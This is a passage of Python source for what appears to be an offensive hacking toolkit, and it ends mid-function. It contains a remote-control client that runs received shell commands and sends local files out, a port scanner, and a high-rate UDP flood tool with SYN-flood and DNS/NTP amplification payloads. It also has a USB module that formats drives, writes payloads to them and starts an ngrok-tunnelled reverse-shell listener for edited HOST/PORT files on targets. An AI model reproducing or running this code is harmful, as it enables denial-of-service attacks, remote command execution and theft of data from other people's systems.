    def direct_stop(self, ack:str, params:str) -> None:
        for hash in self.tasks:
            self.tasks[hash]["manager"].run_until_local = False
        
        if ack:
            self.send(Request("All tasks killed successfully"))

    def direct_destroy(self, ack:str, params:str) -> None:
        for hash in self.tasks:
            self.tasks[hash]["manager"].run_until_local = False
        if ack:
            self.send(Request("Shutting down"))
        
        self.exit_gracefully(None, None)

    def method_connect(self, cmd:str, ack:str, params:str) -> None:
        if cmd in self.connect:
            self.connect[cmd](ack, params)
        else:
            self.send(Request("Invalid command"))
    
    def connect_shell(self, ack:str, params:str) -> None:
        output = self.popen(cmd=params)
        if ack:
            self.send(Request(body=output))

    def connect_download(self, ack:str, params:str) -> None:
        file = params[0]
        if os.path.exists(file):
            with open(file, "rb") as fp:
                self.send(Request(body=fp))
                return

        self.send(Request(f"File {file} Not found.", status=Status.FAIL))

    

    def popen(self, cmd: list) -> str:
        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
        timer = Timer(POPEN_TIMEOUT, process.terminate)
        try:
            timer.start()
            stdout, stderr = process.communicate()
            output = stdout or stderr
        finally:
            timer.cancel()

        final_output = output.replace(b"\r\n", b"\n").decode(encoding="windows-1252").encode()
        return final_output

    def get_hash(self, *args):
        data = []
        if len(args) > 1:
            for n in args:
                if isinstance(n, str):
                    data.append(n)

                if isinstance(n, (tuple, list, set)):
                    data += [*list(n)]
        else:
            data = args

        he = hashlib.md5(str(data).encode()).hexdigest()
        return (int(he, 16) % (1<<32))


logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Define the queue for managing tasks
task_queue = queue.Queue()

# Function to check if a port is open
def scan_port(port, target):
    try:
        # Create a socket object and set a timeout
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)  # Timeout for each port scan in seconds

        # Try connecting to the target IP and port
        result = sock.connect_ex((target, port))

        if result == 0:
            print(f"Port {port} is OPEN")
        else:
            print(f"Port {port} is CLOSED")

        sock.close()
    except socket.error:
        print(f"Error scanning port {port}")

# Worker function to process ports in parallel
def worker(target):
    while True:
        port = task_queue.get()  # Get port from queue
        if port is None:
            break  # End worker if None is received
        scan_port(port, target)  # Scan the port
        task_queue.task_done()  # Mark the task as done

# Function to initiate the scanning process
def start_scan(target, start_port, end_port):
    start_time = time.time()

    # Create a list to hold thread workers
    threads = []

    # Create 50 worker threads to scan ports concurrently
    for _ in range(50):
        t = threading.Thread(target=worker, args=(target,))
        t.daemon = True  # Daemon threads exit when the program ends
        t.start()
        threads.append(t)

    # Add all ports to the task queue
    for port in range(start_port, end_port + 1):
        task_queue.put(port)

    # Wait until all tasks are completed
    task_queue.join()

    # Stop the threads
    for _ in range(50):
        task_queue.put(None)  # Signal threads to stop

    # Wait for threads to finish
    for t in threads:
        t.join()

    end_time = time.time()
    print(f"\nScan complete! Time taken: {end_time - start_time:.2f} seconds.")

# Main Menu Function
def pscan():
    clear_screen()
    print("Welcome to the Advanced Port Scanner!\n")

    while True:
        # Prompt for target and port range
        target = input("Enter the target IP or domain (or 'exit' to return): ").strip()

        if target.lower() == 'exit':
            clear_screen()
            print("Returning to main menu...")
            break

        try:
            start_port = int(input("Enter start port (1-65535): ").strip())
            end_port = int(input("Enter end port (1-65535): ").strip())

            if start_port < 1 or end_port > 65535 or start_port > end_port:
                print("Invalid port range. Please try again.")
                continue

            print(f"Starting scan on {target} from port {start_port} to {end_port}...\n")
            start_scan(target, start_port, end_port)

        except ValueError:
            print("Invalid input. Please enter valid integers for port numbers.")


def print_banner():
    banner = r"""
 ▄▄▄▄▄▄▄▄▄▄▄  ▄         ▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄ 
▐░░░░░░░░░░░▌▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
▐░█▀▀▀▀▀▀▀█░▌▐░▌       ▐░▌ ▀▀▀▀█░█▀▀▀▀ ▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀▀▀ 
▐░▌       ▐░▌▐░▌       ▐░▌     ▐░▌     ▐░▌          ▐░▌          ▐░▌          
▐░▌       ▐░▌▐░▌       ▐░▌     ▐░▌     ▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄▄▄ 
▐░▌       ▐░▌▐░▌       ▐░▌     ▐░▌     ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
▐░▌       ▐░▌▐░▌       ▐░▌     ▐░▌     ▐░█▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀█░▌ ▀▀▀▀▀▀▀▀▀█░▌
▐░▌       ▐░▌▐░▌       ▐░▌     ▐░▌     ▐░▌                    ▐░▌          ▐░▌
▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌     ▐░▌     ▐░█▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄█░▌ ▄▄▄▄▄▄▄▄▄█░▌
▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌     ▐░▌     ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
 ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀       ▀       ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀                                                       
   【 EXTREME 100GB+ POWER NETWORK TESTING TOOL v3.0 】
   【 MULTI-SOCKET PARALLELIZED HIGH-THROUGHPUT ENGINE 】
    """
    print("\033[91m" + banner + "\033[0m")

# Global variables for statistics
total_bytes_sent = 0
packets_sent = 0
start_time = 0
running = True
stats_lock = threading.Lock()

# Try to increase system limits
def increase_system_limits():
    try:
        # Increase open file limits
        if platform.system() != "Windows":
            soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
            resource.setrlimit(resource.RLIMIT_NOFILE, (hard, hard))
            
            # Increase max processes if possible
            try:
                soft, hard = resource.getrlimit(resource.RLIMIT_NPROC)
                resource.setrlimit(resource.RLIMIT_NPROC, (hard, hard))
            except:
                pass
    except Exception as e:
        print(f"[!] Could not increase system limits: {e}")
        pass

# Pre-generate payload patterns for efficiency
def generate_payload_pool(size, method="random", count=1000):
    """Pre-generate a pool of payloads for faster sending"""
    payloads = []
    
    if method == "random":
        # Create multiple different random payloads
        payloads = [os.urandom(size) for _ in range(count)]
    elif method == "zero":
        # All zeros - only need one
        payloads = [b'\x00' * size]
    elif method == "one":
        # All ones - only need one
        payloads = [b'\xff' * size]
    elif method == "pattern":
        # Create a few different pattern variations
        pattern = b"ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
        base_pattern = (pattern * (size // len(pattern) + 1))[:size]
        payloads = [
            base_pattern,
            bytes([b ^ 0xFF for b in base_pattern]),  # Inverted
            bytes([b ^ 0xAA for b in base_pattern]),  # XOR pattern 1
            bytes([b ^ 0x55 for b in base_pattern]),  # XOR pattern 2
        ]
    elif method == "syn":
        # SYN flood-like packet content
        syn_header = struct.pack('!HHLLBBHHH', 
                               random.randint(1024, 65535),  # Source port
                               80,                          # Destination port (HTTP)
                               random.randint(0, 4294967295), # Sequence number
                               0,                           # Acknowledgment number
                               5 << 4,                      # Data offset
                               0x02,                        # Flags (SYN)
                               8192,                        # Window size
                               0,                           # Checksum (not calculated)
                               0)                           # Urgent pointer
        payloads = [syn_header + os.urandom(size - len(syn_header)) for _ in range(count)]
    elif method == "udp_amplify":
        # Create payloads that might trigger amplification responses in vulnerable services
        dns_query = b"\x00\x01\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01" + b"\x03www\x06google\x03com\x00" + b"\x00\x01\x00\x01"
        ntp_monlist = b"\x17\x00\x03\x2a" + b"\x00" * 4
        payloads = [
            dns_query + os.urandom(size - len(dns_query)),
            ntp_monlist + os.urandom(size - len(ntp_monlist)),
            os.urandom(size)
        ]
    elif method == "adaptive":
        # Mix of different payload types for varied traffic patterns
        payloads = [
            os.urandom(size),                             # Random
            b'\x00' * size,                               # Zeros  
            b'\xff' * size,                               # Ones
            bytes([random.randint(0, 255) for _ in range(size)]) # Pseudo-random
        ]
    else:
        # Fallback to random
        payloads = [os.urandom(size) for _ in range(count)]
    
    return payloads

def signal_handler(sig, frame):
    """Handle Ctrl+C"""
    global running
    print("\n\n[!] Stopping all threads and cleaning up this may take a second...")
    running = False
    time.sleep(5)
    clear_screen()
    mainM()

def optimize_socket_performance(sock):
    """Apply advanced socket optimizations"""
    try:
        # Increase send and receive buffer sizes
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 262144)  # 256 KB
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 262144)  # 256 KB
        
        # Low delay type of service
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_TOS, 0x10)
        
        # Allow reuse of local addresses
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        # Disable Nagle's algorithm for lower latency
        try:
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        except:
            pass  # Not a TCP socket
            
        # Don't wait for unsent data on close
        try:
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
        except:
            pass
        
        # Platform-specific optimizations
        if platform.system() == "Linux":
            try:
                # Minimize latency, maximize throughput
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_PRIORITY, 6)
                
                # IPv4 don't fragment flag
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_MTU_DISCOVER, 2)
            except:
                pass
    except Exception as e:
        # Ignore optimization errors
        pass
        
    return sock

def send_packets(target_ip, target_port, payload_size, count, thread_id, interval=0, 
                payload_type="random", port_hopping=False, batch_size=100, multi_socket=True):
    """Send UDP packets from a specific thread with extreme power optimizations"""
    global total_bytes_sent, packets_sent, running
    
    # For extreme power mode, use multiple parallel sockets per thread
    socket_count = 5 if multi_socket else 1
    sockets = []
    
    for _ in range(socket_count):
        # Create socket with minimal overhead
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock = optimize_socket_performance(sock)
        sockets.append(sock)
    
    # Pre-generate larger pool of payloads for extreme throughput
    if count == 0:  # Unlimited mode
        pool_size = 10000  # Increased from 5000
    else:
        pool_size = min(10000, count)
    
    payloads = generate_payload_pool(payload_size, payload_type, pool_size)
    
    # Track performance for adaptive adjustments
    local_packets_sent = 0
    last_check_time = time.time()
    adaptive_interval = interval
    last_update_time = time.time()
    batched_bytes = 0
    
    # Target port(s) management
    if isinstance(target_port, list):
        ports = target_port
    else:
        ports = [target_port]
    
    # Pre-calculate destination addresses for faster sending
    destinations = []
    for port in ports:
        destinations.append((target_ip, port))
    
    # Create a super-sized burst mode for maximum impact
    burst_mode = thread_id % 5 == 0  # Every 5th thread uses burst mode
    burst_size = batch_size * 2 if burst_mode else batch_size
    
    try:
        while (count == 0 or local_packets_sent < count) and running:
            # Performance optimization: batch multiple packets before updating global stats
            batch_count = 0
            current_sock_index = 0
            
            # Send packets in extreme batches for maximum performance
            for _ in range(burst_size):
                if count > 0 and local_packets_sent >= count:
                    break
                    
                if not running:
                    break
                
                # Choose port if port hopping is enabled
                if port_hopping:
                    dest = random.choice(destinations)
                else:
                    dest = destinations[0]
                
                # Select payload from pool (with cycling)
                payload_index = (thread_id * 173 + local_packets_sent) % len(payloads)  # More random distribution
                payload = payloads[payload_index]
                
                # Rotate through sockets for parallelism
                sock = sockets[current_sock_index]
                current_sock_index = (current_sock_index + 1) % socket_count
                
                # Send packet with extreme throughput
                sock.sendto(payload, dest)
                
                # For extreme power, send duplicate packets (multi-layer attack)
                if burst_mode and local_packets_sent % 10 == 0:
                    # Send the same packet 2-3 more times for amplification
                    for _ in range(random.randint(2, 3)):
                        sock.sendto(payload, dest)
                        batched_bytes += len(payload)
                        batch_count += 1
                
                # Local tracking
                local_packets_sent += 1
                batched_bytes += len(payload)
                batch_count += 1
                
                # Ultra-small yield only every 50k packets to maintain maximum throughput
                if local_packets_sent % 50000 == 0:
                    time.sleep(0.00005)
            
            # Update global stats less frequently (batch updates)
            current_time = time.time()
            if current_time - last_update_time >= 0.05:  # Update stats every 50ms (faster updates)
                with stats_lock:
                    total_bytes_sent += batched_bytes
                    packets_sent += batch_count
                batched_bytes = 0
                batch_count = 0
                last_update_time = current_time
            
            # Ultra-adaptive performance monitoring
            if time.time() - last_check_time >= 2.0:
                last_check_time = time.time()
                
                # If in adaptive mode, adjust dynamically for maximum performance
                if interval <= 0 and thread_id == 1:  # Only first thread adjusts
                    if adaptive_interval > 0:
                        adaptive_interval = 0  # Force max speed in extreme power mode
            
            # Apply minimal interval after burst (if any)
            if interval > 0:
                time.sleep(interval * 0.5)  # Cut interval in half for extreme mode
            elif adaptive_interval > 0:
                time.sleep(adaptive_interval * 0.5)  # Cut interval in half for extreme mode
                
    except Exception as e:
        if running:  # Only show error if we're still supposed to be running
            print(f"\n[!] Error in thread {thread_id}: {e}")
    finally:
        # Make sure any remaining stats are counted
        with stats_lock:
            total_bytes_sent += batched_bytes
            packets_sent += batch_count
        # Close all sockets
        for sock in sockets:
            try:
                sock.close()
            except:
                pass

def display_stats():
    """Display ongoing statistics with extreme power metrics (100GB+ capable)"""
    global total_bytes_sent, packets_sent, start_time, running
    
    # Track rate history for smoother display with larger window for extreme rates
    history_size = 8  # Increased for smoother averaging at extreme rates
    pps_history = []
    mbps_history = []
    gbps_history = []
    
    # Enhanced animated indicator for visual feedback
    spinner = "⣾⣽⣻⢿⡿⣟⣯⣷"  # Smoother spinner animation
    spinner_idx = 0
    
    last_packets = 0
    last_bytes = 0
    last_time = time.time()
    peak_gbps = 0  # Track peak bandwidth
    peak_pps = 0   # Track peak packets per second
    
    while running:
        current_time = time.time()
        duration = current_time - start_time
        interval = current_time - last_time
        
        if interval > 0:
            # Calculate instantaneous rates
            interval_packets = packets_sent - last_packets
            interval_bytes = total_bytes_sent - last_bytes
            
            instant_pps = interval_packets / interval
            instant_mbps = (interval_bytes * 8 / 1000000) / interval
            instant_gbps = instant_mbps / 1000
            
            # Track peak rates
            peak_pps = max(peak_pps, instant_pps)
            peak_gbps = max(peak_gbps, instant_gbps)
            
            # Add to history
            pps_history.append(instant_pps)
            mbps_history.append(instant_mbps)
            gbps_history.append(instant_gbps)
            
            # Keep history limited to history_size
            if len(pps_history) > history_size:
                pps_history.pop(0)
            if len(mbps_history) > history_size:
                mbps_history.pop(0)
            if len(gbps_history) > history_size:
                gbps_history.pop(0)
            
            # Use average for smoother display
            pps = sum(pps_history) / len(pps_history)
            mbps = sum(mbps_history) / len(mbps_history)
            gbps = sum(gbps_history) / len(gbps_history)
            
            # Calculate throughput growth rate 
            growth_indicator = ""
            if len(gbps_history) >= 3:
                recent_avg = sum(gbps_history[-3:]) / 3
                older_avg = sum(gbps_history[:-3]) / max(1, len(gbps_history)-3)
                if recent_avg > older_avg * 1.1:
                    growth_indicator = "▲"  # Growing
                elif recent_avg < older_avg * 0.9:
                    growth_indicator = "▼"  # Slowing
                
            # Progress toward 100GB
            total_gb_sent = total_bytes_sent / 1000000000
            
            # Estimate time to 100GB at current rate
            time_to_100gb = "∞"
            if gbps > 0.1:
                gb_remaining = max(0, 100 - total_gb_sent)
                seconds_remaining = gb_remaining * 8 / gbps
                if seconds_remaining < 3600:
                    time_to_100gb = f"{seconds_remaining:.1f}s"
                else:
                    time_to_100gb = f"{seconds_remaining/60:.1f}m"
            
            # Update animation
            spinner_idx = (spinner_idx + 1) % len(spinner)
            spinner_char = spinner[spinner_idx]
            
            # Format stats with color
            sys.stdout.write("\r" + " " * 120)  # Clear line
            
            # Format with color codes for better visibility - 100GB+ format
            # Color coding: higher numbers are more intense colors
            stats = (
                f"\r\033[1m{spinner_char}\033[0m "
                f"\033[1;36m[{duration:.1f}s]\033[0m "
                f"Sent: \033[1;33m{packets_sent:,}\033[0m pkts | "
                f"Rate: \033[1;32m{pps:,.2f}\033[0m pps | "
                f"Data: \033[1;35m{total_gb_sent:.3f}\033[0m GB | "
                f"BW: \033[1;31m{gbps:.3f}\033[0m Gbps {growth_indicator} | "
                f"Peak: \033[1;31m{peak_gbps:.3f}\033[0m Gbps | "
                f"To 100GB: \033[1;33m{time_to_100gb}\033[0m"
            )
            
            sys.stdout.write(stats)
            sys.stdout.flush()
            
            # Update last values
            last_packets = packets_sent
            last_bytes = total_bytes_sent
            last_time = current_time
        
        time.sleep(0.1)  # Update 10 times per second for more responsive display

def turbo_mode_check():
    """Check if the system supports turbo mode with higher performance"""
    cpu_count = multiprocessing.cpu_count()
    mem_gb = os.sysconf('SC_PAGE_SIZE') * os.sysconf('SC_PHYS_PAGES') / (1024.**3) if platform.system() != "Windows" else 8
    
    can_turbo = cpu_count >= 4 and mem_gb >= 4
    
    return can_turbo, cpu_count, mem_gb

def main():
    global start_time, running
    
    # Try to increase system limits
    increase_system_limits()
    
    # Set up Ctrl+C handler
    signal.signal(signal.SIGINT, signal_handler)
    
    # Clear screen and display banner
    os.system('cls' if os.name == 'nt' else 'clear')
    print_banner()
    
    # Check for turbo mode capabilities
    turbo_capable, cpu_count, mem_gb = turbo_mode_check()
    
    print("\n\033[1;31m[!] EXTREME POWER UDP STRESS TESTING TOOL\033[0m")
    print("\033[1;33m[!] USE ONLY ON YOUR OWN NETWORKS/DEVICES\033[0m")
    print(f"\033[1;36m[*] System: {cpu_count} CPU cores, {mem_gb:.1f} GB RAM, {'TURBO CAPABLE' if turbo_capable else 'Standard Mode'}\033[0m\n")
    
    try:
        # Target info
        target_ip = input("\033[1m[*] Target IP address: \033[0m")
        
        # Validate IP format
        try:
            ipaddress.ip_address(target_ip)
        except ValueError:
            print("\n\033[1;31m[!] Invalid IP address format\033[0m")
            return
        
        # Get target port or port range
        port_input = input("\033[1m[*] Target port/range (e.g., 80 or 80-100): \033[0m")
        port_hopping = False
        
        if "-" in port_input:
            try:
                port_start, port_end = map(int, port_input.split("-"))
                if not (0 <= port_start <= 65535 and 0 <= port_end <= 65535 and port_start <= port_end):
                    print("\n\033[1;31m[!] Ports must be between 0-65535 and start port must be <= end port\033[0m")
                    return
                target_ports = list(range(port_start, port_end + 1))
                port_hopping = True
            except ValueError:
                print("\n\033[1;31m[!] Invalid port range format\033[0m")
                return
        else:
            try:
                target_port = int(port_input)
                if not (0 <= target_port <= 65535):
                    print("\n\033[1;31m[!] Port must be between 0-65535\033[0m")
                    return
                target_ports = [target_port]
            except ValueError:
                print("\n\033[1;31m[!] Port must be a number\033[0m")
                return
        
        # Attack configuration - use max power settings
        
        # Get max packet payload size for better performance
        payload_size = int(input("\033[1m[*] Packet payload size in bytes [1-65507, default 8192]: \033[0m") or "8192")
        if payload_size < 1:
            payload_size = 1400
        if payload_size > 65507:  # Max UDP packet size
            payload_size = 65507
            
        # Advanced payload types
        print("\n\033[1m[*] Payload types:\033[0m")
        print("    \033[1;32m1. Random data (most disruptive)\033[0m")
        print("    \033[1;33m2. All zeros\033[0m")
        print("    \033[1;33m3. All ones (0xFF)\033[0m")
        print("    \033[1;33m4. Repeating pattern\033[0m")
        print("    \033[1;31m5. Adaptive (mixed patterns)\033[0m")
        print("    \033[1;31m6. SYN flood simulation\033[0m")
        print("    \033[1;31m7. UDP amplification simulation\033[0m")
        
        payload_type_map = {
            "1": "random",
            "2": "zero",
            "3": "one",
            "4": "pattern",
            "5": "adaptive",
            "6": "syn",
            "7": "udp_amplify"
        }
        
        payload_choice = input("\033[1m[*] Select payload type (1-7, default 1): \033[0m") or "1"
        if payload_choice not in payload_type_map:
            print("\n\033[1;33m[!] Invalid choice, using random data\033[0m")
            payload_type = "random"
        else:
            payload_type = payload_type_map[payload_choice]
        
        # Get number of threads - suggest maximum for extreme power (100+GB capability)
        max_threads = 2000 if turbo_capable else 1000  # Increased max threads
        suggested_threads = min(cpu_count * 25, max_threads)  # More aggressive thread count
        
        threads_input = input(f"\033[1m[*] Number of threads [1-{max_threads}, recommended {suggested_threads}]: \033[0m") or str(suggested_threads)
        try:
            threads = int(threads_input)
            if threads < 1:
                threads = suggested_threads
            if threads > max_threads:
                print(f"\n\033[1;33m[!] Maximum thread count is {max_threads}, setting to maximum\033[0m")
                threads = max_threads
        except ValueError:
            threads = suggested_threads
        
        # For extreme power mode (100GB+), always use unlimited packets
        packets_per_thread = 0  # Unlimited
        
        # For extreme power, always use 0 interval
        interval = 0
        
        # Enable multi-socket mode for extreme power
        multi_socket = True
        
        # Enable high performance mode by default
        high_perf = True
        
        # Set batch size for sending - extremely large batches for 100GB+ power
        batch_size = 2000 if turbo_capable else 1000  # Significantly increased batch size
        
        # Calculate and display test summary with power metrics
        print("\n\033[1;36m[*] EXTREME POWER Test Configuration:\033[0m")
        print(f"    \033[1;37mTarget:         {target_ip}:{port_input}\033[0m")
        print(f"    \033[1;37mThreads:        {threads} (MAX POWER)\033[0m")
        print(f"    \033[1;37mPayload Size:   {payload_size} bytes\033[0m")
        print(f"    \033[1;37mPayload Type:   {payload_type}\033[0m")
        print(f"    \033[1;37mPort Mode:      {'PORT HOPPING' if port_hopping else 'FIXED PORT'}\033[0m")
        print(f"    \033[1;37mBatch Size:     {batch_size} packets/batch\033[0m")
        print(f"    \033[1;31mTotal Packets:  UNLIMITED (MAX POWER MODE)\033[0m")
        print(f"    \033[1;31mSend Interval:  0 (MAXIMUM SPEED)\033[0m")
        
        # Final confirmation before starting
        confirm = input("\n\033[1;31m[*] START EXTREME POWER TEST? (y/n): \033[0m")
        if confirm.lower() != 'y':
            print("\n\033[1;33m[!] Operation cancelled\033[0m")
            return
        
        print("\n\033[1;32m[+] Starting EXTREME POWER UDP test...\033[0m")
        start_time = time.time()
        
        # Start stats display thread
        stats_thread = threading.Thread(target=display_stats)
        stats_thread.daemon = True
        stats_thread.start()
        
        # Create thread pool and start sending packets with extreme power configuration
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = []
            for i in range(threads):
                futures.append(
                    executor.submit(
                        send_packets, 
                        target_ip, 
                        target_ports,  # Pass all ports
                        payload_size,
                        packets_per_thread,
                        i + 1,
                        interval,
                        payload_type,
                        port_hopping,
                        batch_size,
                        multi_socket  # Enable multi-socket for 100GB+ power
                    )
                )
            
            # Let the stress test run indefinitely until Ctrl+C
            while running:
                time.sleep(0.5)
                
                # Check if all threads completed (shouldn't happen in unlimited mode)
                if all(future.done() for future in futures):
                    break
        
        # Final stats
        duration = time.time() - start_time
        pps = packets_sent / duration if duration > 0 else 0
        mbps = (total_bytes_sent * 8 / 1000000) / duration if duration > 0 else 0
        gbps = mbps / 1000
        total_mb = total_bytes_sent / 1000000
        total_gb = total_mb / 1000
        
        print("\n\n\033[1;32m[+] Test completed\033[0m")
        print(f"\033[1;36m[+] Total Duration:    {duration:.2f} seconds\033[0m")
        print(f"\033[1;36m[+] Total Packets:     {packets_sent:,}\033[0m")
        print(f"\033[1;36m[+] Total Data:        {total_mb:.2f} MB ({total_gb:.4f} GB)\033[0m")
        print(f"\033[1;36m[+] Average Rate:      {pps:.2f} packets/second\033[0m")
        print(f"\033[1;36m[+] Average Bandwidth: {mbps:.2f} Mbps ({gbps:.4f} Gbps)\033[0m")
        
    except KeyboardInterrupt:
        clear_screen()
        mainM()
        print("\n\n\033[1;33m[!] Test interrupted by user\033[0m")

    except Exception as e:
        clear_screen()
        mainM()
        print(f"\n\033[1;31m[!] An error occurred: {e}\033[0m")

    finally:
        clear_screen()
        mainM()
        running = False
        print("\n\033[1;32m[*] Test completed\033[0m")

# Initialize colorama for cross-platform colored output
init()

# Setup logging with BoTC theme
logging.basicConfig(filename="botc_usb_ritual.log", level=logging.INFO,
                    format="%(asctime)s - [BoTC Ritual] %(message)s")

# Global variables
stop_monitoring = threading.Event()
last_payload = None
session_id = str(uuid.uuid4())
listener_port = random.randint(20000, 65535)  # Dynamic port for each run

def clear_screen():
    """Clear the terminal screen efficiently."""
    os.write(1, b'\033[2J\033[H') if os.name != 'nt' else os.system('cls')

def play_sound(action):
    """Play a thematic sound (Windows only)."""
    if platform.system() == "Windows":
        try:
            sounds = {"detect": "\x07", "format": "\x07\x07", "write": "\x07\x07\x07"}
            os.write(1, sounds[action].encode())
        except:
            pass

def find_usb_drives():
    """Find USB drives with optimized filtering."""
    usb_drives = []
    for partition in psutil.disk_partitions():
        mount_point = partition.mountpoint
        if 'removable' in partition.opts or '/media/' in mount_point or '/mnt/' in mount_point:
            try:
                shutil.disk_usage(mount_point)
                usb_drives.append(mount_point)
            except OSError as e:
                logging.warning(f"Inaccessible drive skipped: {mount_point} - {e}")
    return usb_drives

def get_device_from_mount(mount_point):
    """Map mount point to device path (Linux)."""
    return next((part.device for part in psutil.disk_partitions() if part.mountpoint == mount_point), None)

def unmount_usb(mount_point):
    """Unmount the USB drive (Linux)."""
    if os.name != 'nt':
        try:
            subprocess.run(['sudo', 'umount', mount_point], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            logging.info(f"Unmounted {mount_point}")
            return True
        except subprocess.CalledProcessError:
            return False
    return True

def mount_usb(device, mount_point="/mnt/botc_usb", filesystem="FAT32"):
    """Mount the USB drive (Linux)."""
    if os.name != 'nt':
        try:
            if os.path.exists(mount_point):
                subprocess.run(['sudo', 'umount', mount_point], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                subprocess.run(['sudo', 'rmdir', mount_point], check=True)
            subprocess.run(['sudo', 'mkdir', '-p', mount_point], check=True)
            mount_cmd = ['sudo', 'mount', device, mount_point]
            if filesystem in ["FAT32", "exFAT"]:
                mount_cmd.extend(['-o', 'uid=1000,gid=1000'])
            subprocess.run(mount_cmd, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            logging.info(f"Mounted {device} at {mount_point}")
            return mount_point
        except subprocess.CalledProcessError:
            return None
    return None

def format_usb(usb_path, filesystem="NTFS", quick=True):
    """Format the USB efficiently."""
    try:
        if os.name == 'nt':
            drive_letter = usb_path.rstrip('\\')
            cmd = ['format', drive_letter, f'/FS:{filesystem}', '/Q' if quick else '', '/Y']
            with tqdm(total=100, desc="Formatting", bar_format="{l_bar}{bar} | {elapsed}", leave=False) as pbar:
                result = subprocess.run(cmd, check=True, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                for _ in range(100):
                    time.sleep(0.02)  # Faster progress
                    pbar.update(1)
            return usb_path
        else:
            device = get_device_from_mount(usb_path)
            if not device or not unmount_usb(usb_path):
                return None
            fs_map = {"NTFS": "mkfs.ntfs", "FAT32": "mkfs.vfat -F 32", "exFAT": "mkfs.exfat"}
            cmd = ['sudo', *fs_map.get(filesystem, "mkfs.vfat -F 32").split(), device]
            with tqdm(total=100, desc="Formatting", bar_format="{l_bar}{bar} | {elapsed}", leave=False) as pbar:
                result = subprocess.run(cmd, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                for _ in range(100):
                    time.sleep(0.02)
                    pbar.update(1)
            logging.info(f"Formatted {usb_path} with {filesystem}")
            return mount_usb(device, filesystem=filesystem)
    except subprocess.CalledProcessError:
        return None

def write_code_to_usb(usb_path, filename, code_content):
    """Write payload to USB with minimal overhead."""
    file_path = os.path.join(usb_path, filename)
    try:
        with open(file_path, 'w', encoding='utf-8') as file:
            file.write(code_content)
        return True
    except Exception as e:
        logging.error(f"Write failed on {file_path}: {e}")
        return False

def eject_usb(usb_path):
    """Eject USB with reduced logging."""
    try:
        if os.name == 'nt':
            script = f"select volume {usb_path.rstrip('\\')}\nremove all dismount"
            with open("eject_script.txt", "w") as f:
                f.write(script)
            subprocess.run(["diskpart", "/s", "eject_script.txt"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            os.remove("eject_script.txt")
        else:
            device = get_device_from_mount(usb_path) or usb_path
            if device:
                subprocess.run(['sudo', 'umount', usb_path], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                subprocess.run(['sudo', 'eject', device], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True
    except Exception:
        return False

def get_ngrok_tunnel(port):
    """Fetch ngrok tunnel URL efficiently."""
    try:
        response = requests.get("http://localhost:4040/api/tunnels", timeout=2)
        tunnels = response.json().get('tunnels', [])
        for tunnel in tunnels:
            if tunnel['proto'] == 'tcp' and tunnel['config']['addr'].endswith(f':{port}'):
                return tunnel['public_url'].replace('tcp://', '')
    except:
        return None

def usb_listener(payload_type, session_id, port=listener_port):
    """Enhanced listener with tracing resistance."""
    global listener_port
    clear_screen()
    print(f"{Fore.RED}=== BoTC USB Listener Ritual ==={Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Payload: {payload_type}, Session: {session_id[:8]}..., Local Port: {port}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Setup Instructions:{Style.RESET_ALL}")
    print(f"1. Open a new terminal.")
    print(f"2. Run: ngrok tcp {port}")
    print(f"3. Copy the public URL (e.g., nc 0.tcp.ngrok.io 12345) from ngrok output.")
    print(f"4. Edit the payload file on the target, replacing 'HOST' and 'PORT'.")
    print(f"5. if this dosent work run (e.g., ngrok tcp 12345 to see any errors.")
    print(f"{Fore.YELLOW}Press Enter when ngrok is running...{Style.RESET_ALL}")
    input()
    
    ngrok_url = get_ngrok_tunnel(port)
    if not ngrok_url:
